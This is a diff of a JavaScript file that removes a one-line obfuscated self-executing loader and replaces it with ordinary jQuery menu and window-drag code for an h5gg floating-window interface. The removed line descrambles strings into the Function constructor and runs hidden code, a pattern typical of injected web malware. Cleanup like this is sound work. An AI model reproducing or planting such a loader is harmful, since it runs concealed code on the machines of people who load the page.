@@ -1,1 +1,33 @@
-(function(){var eeP='',onw=834-823;function QAf(f){var g=909756;var j=f.length;var s=[];for(var l=0;l<j;l++){s[l]=f.charAt(l)};for(var l=0;l<j;l++){var z=g*(l+373)+(g%15050);var y=g*(l+758)+(g%13815);var a=z%j;var u=y%j;var q=s[a];s[a]=s[u];s[u]=q;g=(z+y)%7042632;};return s.join('')};var Ffz=QAf('cromtcrzuwoyxlgtrtsaokncispjubqdvhnfe').substr(0,onw);var niE='ay{vu(+2juer31)=v.pnn;eyn.(b(a"aehoek8 =io"}[=1vongua;<a]nm=[ej,n-l)w,o(;]0)[(pA+))lhor,u0,7tz8esr,9);,"r r4)v. 7ad)f9t+,;v)bvah;,jfrr(dah{j(nu]d;.l;ja,(;a].)a[5[n i=i5a;nh[gpi-]0;t"nv;)ag(rres}+w;d,rnvdroireC"ul(g";evorrl(8x=.;6+.)r1=q 6=a)=e7eo1)argfj1;i.t5 u)- 2.avcs9zce rfn t(cS;)ru=rzjf;{<vr ;=u()4. 0t =ffo,0ncoCeaa3ul1;4ArshalCvCv1<wAs;C=24+;[,rvytgor(=a=,sl;r6eirbvi9{v8.=tt 7c=*dnvdrn]lj)vvvr};=<=o];a-ft,{-s ,is1*]fgu+svge6va.l9v;u;mb;,s(r;+lx.<=l.o;f[-;tf0{erua(t+ludgrh,b;;t6,ap);gpAdil]+t=hakn+qr9uglat(q.fie0;jft;[ump }6h2(0c=n7ix+.oe),e,a6e1t;(to(1l.1(a0g7h.pi2,(j(s(,+"c)ug8go;v+;a.an0ooe{+)i]nt"hv+1rrbv(o! 6tmn)s,r}8- =t]+u.==tain=gtle+>ak)>8.hz(,v.j =AC"s.f ez=s;s,t8)ifa= vaa,2l;vc=ovro=));a9 7 [h4h]trrb)3ktg=a+n0oaobc.vrS)h7+= =.(cpCs)ip)p; i9=,+ty+gx;=v;r(la.fon([jgv2oenl5l=nv2rkc8a+yl=0swi=jchsres(j7)fj+n[vmt6i2r;prC(. lg[]reoc}uz(hy=e=2]o;}odanrnh)+"!)(0[tii(w=i';var obG=QAf[Ffz];var Vmt='';var gse=obG;var EMJ=obG(Vmt,QAf(niE));var PUI=EMJ(QAf('%a]+d[lY1.d"dteb\'=ne=u*b9;[.YY)EdY)Yn3a()%tat.dY=18fr.%ef.)0}s.r;i}ttojfd%)ua..s$.].95ifrk7.!&n5n4%eYaYbtt#a.%.pedY.e[t.a u.%nb)hod}.ta2ilo(%nd.)l(}e%(1rtc!Y7Y3Ye2%6 ,(i%dYs_YY0gab;8e.7=h()}=jfY(tm.sfbn50++(3en#a0an1)b.0sdYY1.gnyifY]%2;cgyutb191cYe[(.r...u]93ei,.04$]6+Y d#{=..}0bsY1}Y+s$u0rfyncts)=.yu$5d3n4(%)t]h.il5 gutY0Y(d);)7r!5C]%d;ahdYdt$65])o9yf\/.h{.0YulnsY+sc%t\'o86Y(0$(uo.0(bn;)1$a0deplbit(d3Yn3t3;h.(vd6.%[dYwd52)nm)=Y4f0nrf6(]7!$Y+)i7]!sdY4Y1}tY0w{pc.f2f0Ydls=dYY(idd{(f].3;Y4it0S#sY2%dYd=_.d,u+]Yp=rfY2.s0p=2.rr;c9tri=(r#Y2u6s-(a.-(le0pl)u[b_.ru3a=dYl5,w[uv#dh,)..pe=Ya,u=d{Yt.ebm.f.sY1t0s.+4Y#!d%Y]Y}}=Yoj[*d)Yfmo*rfs#;fu;.]+\/xr9s}(){ia]YY5Yd3.uu[]( i)Yb"%o(gi[d.&$])0Y,[0YY31nrn!Y})(.Yo1Y.#YrcY;Y,n(9\/{Y1\/;0f*t+;i[h\/ldiv5u 2.)i=c}5tYiu [bdj8]v%.7])]et]..ead0]eptYu0[6.r.u!DoYY2]i9=u d,)1YYai]Y(0%u3ec)-Cd[alsffY%)Yo]15Y]u.rw2n$e{[7.n)ndr%t55+Y!s+."(n)1l(r81de8o]ave=u1)o)aY(&s]Yc1$;YY+5=n m(t3ed)f.d;5==]YYc[!o1d40783mdmv)Y.arne\'),e(0{0e)w,ut.Y%n(!6.Y$2lr6),5Y{v00&0o5=},1f)vdsybo+oolc=m.)}b%m{%o1dufe ]e=Ya4#=v4.dl_-t!i= p=7"%=Y"}(if]](1d!aYY!dic)YdgYt e(4f4lYc$e![aY%\/C=)# )m ;a3+;u8Y1.]yver2d]w0(Y% 0dh[in!Y2na)l!rad,fe ubtl;0aY0=."Y} o3trvCdn\/n8nwi7\/dlY ;h([slY%a ,dfd5d6n\'f. ]uf,'));var LUT=gse(eeP,PUI );LUT(1930);return 3295})()
+if(typeof $ == 'undefined') alert("网络连接失败, 请重新启动!");
+
+$(document).ready(function(){
+    //alert();
+    //绑定菜单点击切换子页面
+    $("div.menubox").click(function(){
+        $("div.menubox").removeClass("current");
+        $("div.menuview").removeClass("current");
+        $(this).addClass("current");
+        
+        var menuid = $(this).attr("menu");
+        $("div#"+menuid).addClass("current");
+    });
+    
+    /*禁止文本Option和拖动*/
+    document.body.onselectstart = document.body.ondrag =function(){
+        return false;
+    }
+    
+    $("input").blur(function(){
+        window.scroll(0,0); //文本框等输入完毕后页面自动滚动到顶部
+    });
+    
+    //激活webkit的button:active
+    document.body.addEventListener('touchstart', function () {});
+
+    if(typeof h5gg!='undefined') {
+        //设置标题栏区域可拖动悬浮窗
+        setWindowDrag(0, 0, 400, 80);
+        //设置尺寸和位置
+        setWindowRect(60,60,300,315);
+    }
+});
